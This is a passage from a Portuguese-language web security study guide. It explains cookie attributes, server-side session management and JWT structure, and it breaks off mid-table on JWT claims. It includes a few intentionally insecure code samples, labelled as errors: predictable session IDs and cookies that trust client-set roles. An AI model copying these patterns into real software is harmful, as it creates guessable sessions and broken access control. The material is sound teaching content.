> [⬅️ 1A. Fundamentos Web (1.1 a 1.6)](./01a-fundamentos-web-parte1.md) | [🏠 **Voltar ao Sumário Principal**](../README.md) | [2.1 Chrome DevTools — Aba Network ➡️](./02a-devtools-network.md)

---

<a id="s1-7"></a>
### 1.7 Cookies, sessões, tokens e autenticação

O HTTP (Hypertext Transfer Protocol — protocolo de transferência de hipertexto) é, por definição, um protocolo **sem estado** (*stateless*): cada requisição é independente e o servidor não "lembra", por conta própria, que duas requisições vieram do mesmo usuário. Toda aplicação que tem login, carrinho de compras, preferências ou qualquer noção de "usuário atual" precisa, portanto, de um mecanismo **adicional** para manter estado entre requisições. Esta seção estuda as quatro peças desse quebra-cabeça:

| Peça | Pergunta que responde | Onde vive |
|---|---|---|
| **Cookie** | "Como o navegador devolve automaticamente um dado ao servidor a cada requisição?" | Navegador (enviado no header `Cookie`) |
| **Sessão** | "Como o servidor guarda o estado de um usuário e o associa a um identificador?" | Servidor (memória, banco, Redis...) |
| **Token** | "Como representar uma credencial/autorização em uma string portátil?" | Cliente (cookie, memória, header `Authorization`) |
| **Autenticação/Autorização** | "Quem é você?" e "O que você pode fazer?" | Lógica da aplicação e provedores de identidade |

> [!NOTE]
> Cookie e sessão **não são sinônimos**. O cookie é um *mecanismo de transporte/armazenamento no navegador*; a sessão é um *conceito do servidor*. O caso mais comum é usar um cookie para transportar o **ID da sessão**, mas é possível ter sessão sem cookie (ex.: token no header) e cookie sem sessão (ex.: preferência de idioma).

<a id="s1-7-1"></a>
#### 1.7.1 Cookies

**O que é:** um cookie é um pequeno par **nome=valor**, acompanhado de atributos, que o servidor pede ao navegador para armazenar (via header de resposta `Set-Cookie`) e que o navegador **reenvia automaticamente** (via header de requisição `Cookie`) nas requisições seguintes que corresponderem às regras de escopo do cookie. A especificação vigente é a **RFC 6265** (*HTTP State Management Mechanism*, 2011), e os navegadores já implementam boa parte do rascunho de revisão **RFC 6265bis** (que formaliza `SameSite`, prefixos de nome, limite de validade etc.).

**Para que serve:**

- **Gerenciamento de sessão:** login, carrinho, estado de formulários multietapas (uso mais crítico para segurança).
- **Personalização:** idioma, tema escuro, moeda preferida.
- **Rastreamento/analytics:** medir visitas e comportamento (muitas vezes por cookies de terceiros — tema sensível do ponto de vista de privacidade e da LGPD, Lei Geral de Proteção de Dados, Lei 13.709/2018).

**Como funciona:**

```mermaid
sequenceDiagram
    participant N as Navegador
    participant S as Servidor (loja-ficticia.test)
    N->>S: POST /login (usuário e senha)
    S-->>N: 200 OK + Set-Cookie: sid=a3f9...; Secure; HttpOnly; SameSite=Lax
    Note over N: Navegador armazena o cookie no "cookie jar"
    N->>S: GET /minha-conta + Cookie: sid=a3f9...
    S-->>N: 200 OK (página personalizada)
```

Exemplo de troca real de headers:

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: __Host-sid=a3f9c2e17b8d4f60a1e2; Path=/; Secure; HttpOnly; SameSite=Lax
Set-Cookie: idioma=pt-BR; Path=/; Max-Age=31536000; Secure; SameSite=Lax
```

```http
GET /minha-conta HTTP/1.1
Host: loja-ficticia.test
Cookie: __Host-sid=a3f9c2e17b8d4f60a1e2; idioma=pt-BR
```

Repare em três detalhes importantes:

1. Cada cookie exige **um header `Set-Cookie` separado** na resposta (não se juntam vários cookies em uma linha de `Set-Cookie`).
2. No header `Cookie` da requisição, o navegador envia **apenas `nome=valor`**, separados por `; `. Os atributos (Secure, Path, etc.) **nunca** voltam ao servidor — o servidor não tem como saber, só pela requisição, com quais atributos o cookie foi criado.
3. O valor do cookie é texto opaco para o navegador; se for um dado estruturado, cabe ao servidor codificá-lo (e, se for confiável, assiná-lo).

##### Atributos do `Set-Cookie`

| Atributo | Função | Valor padrão se omitido | Observação de segurança |
|---|---|---|---|
| `Domain` | Define para quais hosts o cookie é enviado | **Host-only**: apenas o host exato que o definiu | Definir `Domain` **amplia** o escopo para todos os subdomínios |
| `Path` | Prefixo de caminho da URL para o qual o cookie é enviado | Diretório da URL que gerou o cookie | **Não** é fronteira de segurança |
| `Expires` | Data/hora absoluta de expiração (formato HTTP-date) | Cookie **de sessão** (apagado quando o navegador encerra a sessão) | Cookies longos aumentam a janela de roubo |
| `Max-Age` | Tempo de vida em **segundos** a partir do recebimento | Idem | Tem **precedência** sobre `Expires` se ambos existirem |
| `Secure` | Só envia o cookie em conexões seguras (HTTPS) | Enviado também em HTTP | Essencial para cookies de sessão |
| `HttpOnly` | Impede acesso via JavaScript (`document.cookie`) | Acessível por JS | Mitiga roubo de cookie via XSS (Cross-Site Scripting) |
| `SameSite` | Controla envio em requisições *cross-site* (`Strict`, `Lax`, `None`) | No Chrome, ausência é tratada como `Lax` **[Varia por versão]** | Defesa em profundidade contra CSRF (Cross-Site Request Forgery) |
| `Partitioned` | Armazena o cookie particionado por site de nível superior (CHIPS) | Não particionado | Exige `Secure` |

###### `Domain`

- **Sem `Domain`** (recomendado na maioria dos casos): o cookie é **host-only**. Se `www.loja-ficticia.test` define `sid=...` sem `Domain`, ele **não** será enviado para `api.loja-ficticia.test`.
- **Com `Domain=loja-ficticia.test`**: o cookie passa a ser enviado para `loja-ficticia.test` **e todos os seus subdomínios** (`www.`, `api.`, `blog.`, `qualquer-coisa.`...). Um ponto inicial (`.loja-ficticia.test`) é ignorado pela RFC 6265 — o comportamento é o mesmo.
- O servidor **não** pode definir `Domain` para um domínio ao qual ele não pertence (ex.: `www.loja-ficticia.test` não pode criar cookie com `Domain=example.com`), nem para um **sufixo público** como `com.br` ou `github.io` (os navegadores consultam a *Public Suffix List*).

```http
Set-Cookie: tema=escuro; Domain=loja-ficticia.test; Path=/; Max-Age=2592000; Secure
```

> [!WARNING]
> Definir `Domain` no cookie de sessão significa que **qualquer subdomínio** — inclusive um blog legado, um ambiente de homologação esquecido ou um subdomínio sujeito a *subdomain takeover* — receberá (e poderá até sobrescrever) esse cookie. Prefira cookies host-only, idealmente com o prefixo `__Host-`.

###### `Path`

Restringe o envio a URLs cujo caminho comece com o valor indicado. `Path=/admin` faz o cookie ir para `/admin` e `/admin/usuarios`, mas não para `/loja`.

```http
Set-Cookie: painel_layout=compacto; Path=/admin; Secure; SameSite=Strict
```

> [!IMPORTANT]
> `Path` é uma **conveniência de organização**, não um mecanismo de isolamento. Páginas do mesmo *origin* em outro caminho podem ler o cookie, por exemplo abrindo um `<iframe>` para `/admin` e acessando seu `document.cookie` (a Same-Origin Policy permite, veja [1.11.1](#s1-11-1)). Nunca use `Path` para separar aplicações de confiança diferente no mesmo host.

###### `Expires` e `Max-Age`

```http
Set-Cookie: lembrar=1; Expires=Thu, 29 Oct 2027 08:00:00 GMT; Secure; HttpOnly
Set-Cookie: banner_fechado=1; Max-Age=86400; Secure
Set-Cookie: sid=; Max-Age=0; Path=/; Secure; HttpOnly
```

- `Expires` usa data absoluta (sensível ao relógio do cliente); `Max-Age` usa segundos relativos (mais robusto). Se ambos estiverem presentes, **`Max-Age` vence**.
- `Max-Age=0` (ou um `Expires` no passado) é a forma padrão de **apagar** um cookie. Para apagar, o `Set-Cookie` precisa ter o mesmo **nome, `Domain` e `Path`** do cookie original — caso contrário, cria-se outro cookie em vez de apagar o primeiro.
- Sem nenhum dos dois, o cookie é **de sessão** (*session cookie*) e some quando o navegador encerra a sessão. **Cuidado:** a opção "Continuar de onde parou" de alguns navegadores restaura cookies de sessão, então "cookie de sessão" não garante logout ao fechar o navegador.
- O rascunho RFC 6265bis recomenda limitar a validade a no máximo **400 dias**; o Chrome aplica esse teto **[Varia por versão]**.

###### `Secure`

O cookie só é enviado em requisições por esquema seguro (HTTPS; `localhost` costuma ser tratado como contexto seguro pelos navegadores para facilitar o desenvolvimento). Além disso, navegadores modernos **não permitem** que uma página HTTP crie ou sobrescreva um cookie marcado como `Secure` (*Leave Secure Cookies Alone*).

**[REQUISITO]** Cookies de sessão e quaisquer cookies que carreguem credenciais devem ter `Secure` e o site deve usar HTTPS em todas as páginas (complementado por HSTS — veja [Headers de Segurança](./05-headers-de-seguranca.md#s5)).

###### `HttpOnly`

Torna o cookie **invisível para JavaScript**: ele não aparece em `document.cookie` nem pode ser modificado por scripts. Continua sendo enviado normalmente nas requisições HTTP (inclusive `fetch` e `XMLHttpRequest` com credenciais).

```javascript
// Na página https://loja-ficticia.test após o Set-Cookie do exemplo acima:
console.log(document.cookie);
// "idioma=pt-BR"   ← o __Host-sid (HttpOnly) NÃO aparece
```

**[REQUISITO]** Cookies de sessão devem ser `HttpOnly`, a menos que exista uma razão técnica documentada (raríssimo).

> [!NOTE]
> `HttpOnly` **não impede** que um XSS faça requisições autenticadas em nome da vítima (o navegador anexa o cookie automaticamente). Ele impede apenas que o atacante **leia e exfiltre** o valor do cookie para usá-lo de outro lugar. É mitigação, não cura — a cura é eliminar o XSS (veja [Vulnerabilidades](./03a-vulnerabilidades-parte1.md#s3)).

###### `SameSite`

Antes de entender os valores, é preciso distinguir **site** de **origin**:

- **Origin** = esquema + host + porta (veja [1.11.1](#s1-11-1)).
- **Site** = esquema + **domínio registrável** (eTLD+1, *effective Top-Level Domain* + 1 rótulo). `https://www.loja-ficticia.test` e `https://api.loja-ficticia.test` são **origins diferentes, mas o mesmo site**. Com o conceito de *schemeful same-site*, `http://` e `https://` do mesmo domínio são sites diferentes.

| Valor | Requisições *same-site* | Navegação de nível superior *cross-site* com método seguro (GET, ex.: clicar em link) | Subrequisições *cross-site* (img, iframe, fetch, POST de formulário vindo de outro site) |
|---|---|---|---|
| `Strict` | Envia | **Não envia** | Não envia |
| `Lax` | Envia | Envia | Não envia |
| `None` | Envia | Envia | Envia (exige `Secure`) |

```http
Set-Cookie: __Host-sid=a3f9c2e17b8d4f60a1e2; Path=/; Secure; HttpOnly; SameSite=Lax
Set-Cookie: csrf_banco=7d1e...; Path=/; Secure; HttpOnly; SameSite=Strict
Set-Cookie: widget_chat=u-77; Path=/; Secure; SameSite=None; Partitioned
```

Detalhes cobrados com frequência:

- **`Strict`** é o mais restritivo: se o usuário estiver logado no banco e clicar em um link para o banco a partir do e-mail, a primeira página carrega **como se ele não estivesse logado** (o cookie não vai). Por isso é comum usar `Lax` para o cookie de sessão "de navegação" e `Strict` para cookies que autorizam ações sensíveis.
- **`Lax`** bloqueia o cenário clássico de CSRF via formulário `POST` auto-submetido a partir de outro site, mas **não** protege endpoints que alteram estado via `GET` (o que já é um erro de design — `GET` deve ser seguro, conforme a RFC 9110).
- **`None`** é necessário para cookies que precisam ir em contextos de terceiros (widgets embutidos, SSO em iframe). Navegadores modernos **rejeitam** `SameSite=None` sem `Secure`.
- **Padrão Lax** **[Varia por versão]**: desde 2020 o Chrome trata cookies sem `SameSite` como `Lax`, com uma exceção temporária conhecida como "Lax + POST" (cookies recém-criados, há cerca de 2 minutos, ainda são enviados em `POST` de nível superior cross-site, para não quebrar fluxos de SSO). Outros navegadores têm comportamentos padrão diferentes — por isso **declare `SameSite` explicitamente**.

**[RECOMENDAÇÃO]** Defina `SameSite=Lax` ou `Strict` explicitamente nos cookies de sessão. Mas **SameSite não substitui tokens anti-CSRF** em aplicações sensíveis: ele não protege contra ataques originados de subdomínios do mesmo site (são *same-site*), e o comportamento varia entre navegadores.

###### `Partitioned` (CHIPS)

CHIPS (*Cookies Having Independent Partitioned State* — cookies com estado particionado independente) permite que um serviço embutido como terceiro (ex.: um chat `chat.example.com` embutido em `loja-ficticia.test`) tenha um cookie **separado por site de nível superior**. O cookie criado quando o widget está em `loja-ficticia.test` **não** é enviado quando o mesmo widget aparece em `outra-loja.test`. Isso permite funcionalidade legítima (manter o estado do chat) sem permitir rastreamento entre sites.

```http
Set-Cookie: __Host-chat_estado=abc123; Secure; Path=/; SameSite=None; Partitioned
```

- Exige `Secure`; a documentação do Chrome recomenda usar também o prefixo `__Host-` para vincular o cookie ao host.
- Suporte e comportamento **[Varia por versão]**: implementado no Chromium e no Firefox; verifique o suporte atual em outros motores.

##### Prefixos de nome `__Secure-` e `__Host-`

Os prefixos são uma "trava" imposta pelo **navegador**: se o nome do cookie começar com um deles e o `Set-Cookie` não cumprir as regras, o navegador **rejeita** o cookie. Como o servidor não vê os atributos na requisição, o prefixo é a única forma de o servidor ter garantias sobre *como* o cookie foi criado.

| Prefixo | Regras exigidas pelo navegador | Garantia obtida |
|---|---|---|
| `__Secure-` | Atributo `Secure` e definido a partir de origem segura (HTTPS) | Cookie não pode ter sido criado/sobrescrito por uma página HTTP |
| `__Host-` | `Secure`, origem segura, **sem** `Domain` e `Path=/` | Além do anterior: cookie é host-only, não pode ser injetado por subdomínios |

```http
Set-Cookie: __Host-sid=a3f9c2e17b8d4f60; Path=/; Secure; HttpOnly; SameSite=Lax     ✅ aceito
Set-Cookie: __Host-sid=a3f9c2e17b8d4f60; Domain=loja-ficticia.test; Path=/; Secure ❌ rejeitado (tem Domain)
Set-Cookie: __Host-sid=a3f9c2e17b8d4f60; Path=/conta; Secure                       ❌ rejeitado (Path ≠ /)
Set-Cookie: __Secure-pref=1; Secure; Domain=loja-ficticia.test                     ✅ aceito
Set-Cookie: __Secure-pref=1; Domain=loja-ficticia.test                             ❌ rejeitado (sem Secure)
```

**[BOA PRÁTICA]** Use `__Host-` no cookie de sessão sempre que a arquitetura não exigir compartilhamento entre subdomínios. Isso neutraliza ataques de **cookie tossing** (um subdomínio comprometido "joga" um cookie com o mesmo nome para o domínio pai, tentando fixar a sessão da vítima).

##### Cookies primários (*first-party*) vs. de terceiros (*third-party*)

- **Primeira parte:** o cookie pertence ao **mesmo site** que aparece na barra de endereços. Ex.: você está em `loja-ficticia.test` e ela define `__Host-sid`.
- **Terceira parte:** o cookie pertence a um **site diferente** daquele da barra de endereços, normalmente por causa de um recurso embutido (iframe, script, pixel de rastreamento). Ex.: em `loja-ficticia.test` há um `<img src="https://ads.example.com/pixel.gif">` e `ads.example.com` define um cookie `SameSite=None; Secure`.

| Aspecto | Primeira parte | Terceira parte |
|---|---|---|
| Uso típico | Sessão, carrinho, preferências | Publicidade, rastreamento entre sites, widgets, SSO embutido |
| `SameSite` necessário | `Lax`/`Strict` funcionam | Exige `SameSite=None; Secure` |
| Situação nos navegadores | Suportado | Safari e Firefox bloqueiam/particionam por padrão; no Chrome, depende das configurações do usuário e do modo anônimo **[Varia por versão]** |
| Alternativas modernas | — | CHIPS (`Partitioned`), Storage Access API, FedCM para login federado |

> [!NOTE]
> Por anos o Google anunciou a descontinuação dos cookies de terceiros no Chrome. Em 2024–2025 a empresa recuou e decidiu **manter** os cookies de terceiros por padrão, deixando o controle nas configurações de privacidade do usuário (no modo anônimo, eles são bloqueados por padrão). Como esse cenário mudou várias vezes, trate qualquer afirmação sobre "o Chrome bloqueia cookies de terceiros" como **[Varia por versão]** e confira a documentação atual.

##### Limites práticos

A RFC 6265 recomenda que os navegadores suportem **pelo menos** 4096 bytes por cookie (nome + valor + atributos), 50 cookies por domínio e 3000 cookies no total. Na prática, todo cookie aplicável viaja em **toda** requisição ao domínio (inclusive imagens e CSS), então cookies grandes degradam desempenho — mais um motivo para guardar no cookie só um identificador, e não dados.

##### Possíveis problemas de segurança

| Problema | Causa | Consequência |
|---|---|---|
| Roubo de sessão via XSS | Cookie de sessão sem `HttpOnly` | `document.cookie` é exfiltrado e o atacante assume a conta |
| Interceptação em rede | Cookie sem `Secure`, site com páginas HTTP | Atacante na mesma rede (Wi-Fi público) captura o cookie em texto claro |
| CSRF | Cookie enviado em requisições cross-site sem token anti-CSRF | Ações executadas em nome da vítima |
| Escopo excessivo | `Domain=` amplo | Subdomínios comprometidos leem/sobrescrevem o cookie |
| Cookie tossing / fixação | Ausência de prefixo `__Host-` | Subdomínio planta cookie com nome igual |
| Dados sensíveis no cookie | Guardar CPF, perfil, `admin=true` em texto claro | Exposição e **adulteração** pelo cliente (o usuário edita o cookie no DevTools) |
| Persistência excessiva | `Max-Age` de anos em cookie de autenticação | Janela de abuso longa em caso de roubo |

Exemplo de erro clássico — **confiar no cliente**:

```http
Set-Cookie: usuario=maria; Path=/
Set-Cookie: perfil=cliente; Path=/
```

Um usuário mal-intencionado abre o DevTools (aba Application, veja [DevTools — Application](./02b-devtools-application.md#s2-2)), troca `perfil=cliente` por `perfil=admin` e recarrega. Se o servidor confiar nesse valor, há uma falha grave de controle de acesso. **O valor de um cookie é entrada não confiável**, exatamente como um parâmetro de URL.

##### Configuração segura

**[REQUISITO]** Para cookies de sessão/autenticação: `Secure`, `HttpOnly`, valor aleatório e imprevisível, transmitido apenas por HTTPS.
**[RECOMENDAÇÃO]** `SameSite=Lax` (ou `Strict`), prefixo `__Host-`, sem `Domain`, `Path=/`, e validade curta compatível com o risco.
**[BOA PRÁTICA]** Não guardar dados pessoais em cookies; se for inevitável guardar algo no cliente, assiná-lo (HMAC, *Hash-based Message Authentication Code*) e validar no servidor; revisar periodicamente os cookies emitidos.

Exemplos de configuração em frameworks comuns:

```javascript
// Node.js + Express + express-session (exemplo didático)
const session = require('express-session');

app.set('trust proxy', 1); // se estiver atrás de proxy reverso que termina o TLS
app.use(session({
  name: '__Host-sid',
  secret: process.env.SESSION_SECRET,   // nunca fixo no código
  resave: false,
  saveUninitialized: false,             // não cria sessão para visitante anônimo
  cookie: {
    secure: true,
    httpOnly: true,
    sameSite: 'lax',
    path: '/',
    maxAge: 30 * 60 * 1000              // 30 minutos
  }
}));
```

```python
# Django — settings.py
SESSION_COOKIE_NAME = "__Host-sessionid"
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SAMESITE = "Lax"
SESSION_COOKIE_AGE = 1800            # 30 minutos
CSRF_COOKIE_SECURE = True
```

```nginx
# Nginx como proxy: reforçando flags em cookies emitidos por um backend legado
# (proxy_cookie_flags existe a partir do Nginx 1.19.3)
location / {
    proxy_pass http://127.0.0.1:8080;
    proxy_cookie_flags ~ secure httponly samesite=lax;
}
```

> [!TIP]
> Para inspecionar visualmente nome, valor, `Domain`, `Path`, expiração, tamanho e flags de cada cookie — e ver por que um cookie foi bloqueado — use o painel **Application → Storage → Cookies** e a aba **Cookies** de cada requisição no painel Network. O passo a passo está em [DevTools — Application](./02b-devtools-application.md#s2-2) e [DevTools — Network](./02a-devtools-network.md#s2-1).

<a id="s1-7-2"></a>
#### 1.7.2 Sessões no servidor

**O que é:** uma **sessão** é um conjunto de dados mantido **no servidor** e associado a um usuário durante um período de interação. O cliente recebe apenas um **identificador de sessão** (*session ID*) — um valor aleatório e opaco que funciona como "número da comanda": quem apresenta a comanda é tratado como o dono dela.

**Para que serve:** manter o estado de autenticação (quem está logado), dados temporários (carrinho, etapa de um assistente), tokens anti-CSRF e metadados de segurança (horário de login, nível de autenticação, se passou por MFA).

**Como funciona:**

```mermaid
sequenceDiagram
    participant N as Navegador
    participant A as Aplicação
    participant R as Armazenamento de sessões (Redis/BD)
    N->>A: POST /login (credenciais)
    A->>A: Valida senha (hash) e MFA
    A->>R: CREATE sessão {id: "Xk9...", userId: 4821, criadaEm, ultimoAcesso}
    A-->>N: Set-Cookie: __Host-sid=Xk9...; Secure; HttpOnly; SameSite=Lax
    N->>A: GET /pedidos (Cookie: __Host-sid=Xk9...)
    A->>R: GET sessão "Xk9..."
    R-->>A: {userId: 4821, ...}
    A-->>N: 200 OK (pedidos do usuário 4821)
```

##### O ID de sessão

O ID de sessão é, na prática, uma **credencial equivalente à senha** enquanto a sessão estiver válida. Requisitos (alinhados ao *OWASP Session Management Cheat Sheet*):

- **Imprevisível:** gerado por um CSPRNG (*Cryptographically Secure Pseudo-Random Number Generator* — gerador de números pseudoaleatórios criptograficamente seguro), com pelo menos **64 bits de entropia** (na prática, usa-se 128 bits ou mais).
- **Sem significado:** não deve conter dados do usuário, timestamps legíveis ou contadores sequenciais.
- **Nome genérico:** nomes como `PHPSESSID`, `JSESSIONID` ou `ASP.NET_SessionId` revelam a tecnologia (*fingerprinting*); a OWASP recomenda nomes neutros como `id` ou `sid`.

```python
# Geração correta de um ID de sessão em Python
import secrets
session_id = secrets.token_urlsafe(32)   # 32 bytes = 256 bits de entropia
# Ex.: 'q3Zr1mJ0d6c0lV5kq0f4N0a8u2k8...'

# ERRADO: previsível
import random, time
session_id_ruim = str(random.randint(0, 999999))       # random não é CSPRNG
session_id_pior = f"{user_id}-{int(time.time())}"       # adivinhável
```

##### Armazenamento das sessões

| Onde | Vantagens | Desvantagens |
|---|---|---|
| Memória do processo | Simples, rápido | Perde tudo ao reiniciar; não escala para vários servidores |
| Banco relacional | Persistente, consultável | Mais lento; exige limpeza de sessões expiradas |
| Redis/Memcached | Rápido, TTL (*Time To Live*) nativo, compartilhado entre instâncias | Mais um componente para proteger (autenticação, rede privada) |
| Cookie assinado/criptografado (*client-side session*) | Sem estado no servidor | Difícil revogar; tamanho limitado; vira, na prática, um "token autocontido" (veja [1.7.3](#s1-7-3)) |

##### Expiração ociosa e absoluta

- **Expiração por inatividade (*idle timeout*):** encerra a sessão após X minutos sem requisições. A OWASP cita como referência algo em torno de **2–5 minutos** para aplicações de alto valor e **15–30 minutos** para aplicações de baixo risco.
- **Expiração absoluta (*absolute timeout*):** encerra a sessão após um tempo máximo desde o login, **mesmo com atividade contínua** (ex.: 4–8 horas para uma aplicação de escritório). Limita o tempo de uso de um ID roubado.
- **Renovação periódica:** regenerar o ID de tempos em tempos durante sessões longas.

**[REQUISITO]** Os timeouts devem ser **aplicados no servidor**. Um contador regressivo em JavaScript ou a expiração do cookie no navegador são apenas cosméticos — o atacante que roubou o ID simplesmente o reenvia.

```python
# Pseudocódigo de validação de sessão no servidor
from datetime import datetime, timedelta

IDLE = timedelta(minutes=15)
ABSOLUTO = timedelta(hours=8)

def validar_sessao(sessao):
    agora = datetime.utcnow()
    if agora - sessao.ultimo_acesso > IDLE:
        destruir(sessao); return None
    if agora - sessao.criada_em > ABSOLUTO:
        destruir(sessao); return None
    sessao.ultimo_acesso = agora
    salvar(sessao)
    return sessao
```

##### Regeneração do ID após login (prevenção de *session fixation*)

Na **fixação de sessão**, o atacante obtém um ID de sessão válido (anônimo) e faz a vítima usá-lo (por exemplo, plantando o cookie via subdomínio ou, em sistemas antigos, via ID na URL: `https://loja-ficticia.test/;jsessionid=ABC123`). Quando a vítima faz login, se o servidor **mantiver o mesmo ID**, o atacante — que já conhece o ID — passa a estar autenticado como a vítima.

**[REQUISITO]** Gerar um **novo ID de sessão** em toda mudança de nível de privilégio: login, elevação para administrador, conclusão de MFA, troca de senha.

```php
<?php
// PHP: após validar credenciais
session_start();
if (verificar_credenciais($usuario, $senha)) {
    session_regenerate_id(true);   // true = apaga a sessão antiga no servidor
    $_SESSION['user_id'] = $idUsuario;
    $_SESSION['login_em'] = time();
}
```

```javascript
// Express: regenerar sessão após login
app.post('/login', async (req, res, next) => {
  const usuario = await autenticar(req.body.email, req.body.senha);
  if (!usuario) return res.status(401).json({ erro: 'Credenciais inválidas' });
  req.session.regenerate(err => {        // cria novo ID e descarta o anterior
    if (err) return next(err);
    req.session.userId = usuario.id;
    res.redirect('/minha-conta');
  });
});
```

##### Logout invalidando no servidor

Um logout que só apaga o cookie no navegador é **incompleto**: se o ID tiver sido copiado antes (XSS, computador compartilhado, log de proxy), ele continua válido.

**[REQUISITO]** O logout deve **destruir a sessão no armazenamento do servidor** e, adicionalmente, instruir o navegador a apagar o cookie.

```javascript
app.post('/logout', (req, res, next) => {
  req.session.destroy(err => {           // remove a sessão do armazenamento
    if (err) return next(err);
    res.clearCookie('__Host-sid', { path: '/', secure: true, httpOnly: true, sameSite: 'lax' });
    res.set('Clear-Site-Data', '"cache", "cookies", "storage"'); // limpeza adicional no navegador
    res.redirect('/');
  });
});
```

```http
HTTP/1.1 303 See Other
Location: /
Set-Cookie: __Host-sid=; Path=/; Max-Age=0; Secure; HttpOnly; SameSite=Lax
Clear-Site-Data: "cache", "cookies", "storage"
```

> [!TIP]
> O header `Clear-Site-Data` pede ao navegador que limpe dados do *origin* (cache, cookies, armazenamento). É útil no logout, especialmente em computadores compartilhados. Detalhes em [Headers de Segurança](./05-headers-de-seguranca.md#s5).

##### Possíveis problemas de segurança

- **Sequestro de sessão (*session hijacking*):** roubo do ID por XSS, sniffing em HTTP, malware ou logs.
- **Fixação de sessão:** ausência de regeneração do ID no login.
- **IDs previsíveis:** gerados com `random`, timestamps ou contadores.
- **ID na URL:** vaza via header `Referer`, histórico, logs de servidor e compartilhamento de links.
- **Sessões eternas:** sem timeout ocioso/absoluto.
- **Logout cosmético:** só apaga o cookie no cliente.
- **Ausência de invalidação após troca de senha:** o atacante que já estava logado continua logado.

##### Configuração segura (resumo)

**[REQUISITO]** ID gerado por CSPRNG (≥ 64 bits de entropia), transportado em cookie `Secure; HttpOnly`, nunca na URL; regeneração no login; logout destruindo a sessão no servidor; timeouts aplicados no servidor.
**[RECOMENDAÇÃO]** `SameSite=Lax/Strict` e prefixo `__Host-`; invalidar todas as sessões do usuário ao trocar a senha; oferecer ao usuário a lista de "sessões ativas" com opção de encerrá-las.
**[BOA PRÁTICA]** Registrar (log) criação/destruição de sessões sem gravar o ID completo; reautenticação para operações críticas (alterar e-mail, transferir dinheiro).

<a id="s1-7-3"></a>
#### 1.7.3 Tokens e JWT (JSON Web Token)

**O que é:** em segurança web, um **token** é uma sequência de caracteres (string) que representa uma credencial de acesso, identidade ou permissão emitida por um servidor para que o cliente a apresente nas requisições subsequentes. Os tokens dividem-se em duas categorias arquiteturais fundamentais:

1. **Tokens opacos (*opaque tokens* / *reference tokens*):** são strings aleatórias sem significado intrínseco (ex.: `tkn_9f8a7d6c5b4e3a2f1...`), idênticas em natureza a um ID de sessão ([1.7.2](#s1-7-2)). Para saber quem é o dono do token ou quando ele expira, o servidor precisa consultar um armazenamento central (banco de dados ou Redis).
2. **Tokens autocontidos (*self-contained tokens* / *value tokens*):** carregam dentro da própria string os dados do usuário, metadados de expiração e uma **assinatura criptográfica** que garante que esses dados foram emitidos pelo servidor e não foram adulterados. O formato padrão da indústria para tokens autocontidos é o **JWT** (*JSON Web Token* — token web em JSON), especificado na **RFC 7519**.

| Característica | Token Opaco (por referência) | Token Autocontido (JWT — RFC 7519) |
|---|---|---|
| Conteúdo da string | Aleatório (CSPRNG); não revela nada a quem lê | Estruturado (JSON codificado em Base64URL); legível por qualquer um (em JWS) |
| Verificação no servidor | Exige consulta ao banco/Redis a cada requisição (*stateful*) | Verificação matemática local da assinatura (*stateless*) |
| Tamanho típico | Pequeno (~32 a 64 bytes) | Maior (~250 a 1500+ bytes, dependendo dos *claims*) |
| Revogação imediata | Trivial (basta apagar o registro no servidor) | Complexa (o token continua matematicamente válido até expirar, salvo *denylist*) |
| Escalabilidade em microsserviços | Todos os serviços precisam consultar o mesmo store central | Cada microsserviço valida o token localmente usando a chave pública do emissor |

**Para que serve:** autenticar clientes em APIs REST ([1.10](#s1-10)) e aplicações de página única (SPA — *Single-Page Application*), propagar identidade e permissões entre microsserviços sem sobrecarregar um banco central de sessões, implementar login federado (OAuth 2.0 e OpenID Connect — [1.7.4](#s1-7-4)) e autorizar ações pontuais de curta duração (ex.: link de redefinição de senha ou download temporário de arquivo).

**Como funciona:**

A família de especificações JOSE (*Javascript Object Signing and Encryption*) define que um JWT pode ser um **JWS** (*JSON Web Signature*, **RFC 7515** — assinado, mas cujo conteúdo é legível) ou um **JWE** (*JSON Web Encryption*, **RFC 7516** — criptografado e opaco para terceiros). Na imensa maioria das aplicações web, "JWT" refere-se a um **JWS**, composto por **três partes separadas por ponto (`.`)**:

```text
xxxxxxxxxxxx.yyyyyyyyyyyyyyyyyyyyyyyy.zzzzzzzzzzzzzzzzzzzzz
   Header            Payload                Signature
```

Cada uma das três partes é codificada em **Base64URL** (RFC 4648 — variante do Base64 que substitui `+` por `-`, `/` por `_` e remove o preenchimento `=`, tornando a string segura para viajar em URLs e headers HTTP sem precisar de *percent-encoding*):

1. **Header (JOSE Header):** objeto JSON que declara o tipo do token (`"typ": "JWT"`), o algoritmo criptográfico usado na assinatura (`"alg": "RS256"`, `"HS256"`, `"ES256"`, etc.) e, opcionalmente, o identificador da chave (`"kid"`).
2. **Payload (JWS Payload / Claims Set):** objeto JSON contendo as **afirmações (*claims*)** sobre a entidade (normalmente o usuário) e metadados do token.
3. **Signature (Assinatura):** resultado da função criptográfica aplicada sobre a string literal `Base64URL(Header) + "." + Base64URL(Payload)` usando a chave secreta (simétrica) ou chave privada (assimétrica) do servidor emissor.

> [!CAUTION]
> **Base64URL NÃO é criptografia — é apenas codificação de transporte!** Qualquer pessoa (inclusive o usuário no navegador, um atacante que intercepte o token ou qualquer site de terceiros) pode pegar as duas primeiras partes de um JWT (JWS), aplicar `atob()` ou `Buffer.from(..., 'base64url')` e ler todo o JSON em texto claro. A assinatura garante **integridade e autenticidade** (ninguém consegue alterar o payload sem invalidar a assinatura), mas **não garante confidencialidade**. Se o payload precisar ser secreto, deve-se usar **JWE** (RFC 7516) ou manter o dado no servidor.

##### Claims registrados (RFC 7519, Seção 4.1)

Os *claims* do payload dividem-se em **registrados** (padronizados pela IANA), **públicos** e **privados** (definidos pela aplicação, como `role` ou `tenant_id`). Os *claims* registrados essenciais para provas e auditorias são:

| Claim | Nome completo | Significado e uso na validação |
|---|---|---|
| `iss` | *Issuer* (Emissor) | Identifica quem emitiu o token (ex.: `"https://auth.loja-ficticia.test"`). O servidor deve validar se confia nesse emissor. |
| `sub` | *Subject* (Sujeito) | Identifica o dono do token — geralmente o ID único e imutável do usuário (ex.: `"usr_4821"`). Evite usar e-mail se o usuário puder trocá-lo. |
| `aud` | *Audience* (Público-alvo) | Identifica para qual destinatário/API o token foi feito (ex.: `"https://api.loja-ficticia.test"`). Impede que um token emitido para o Serviço A seja aceito pelo Serviço B. |
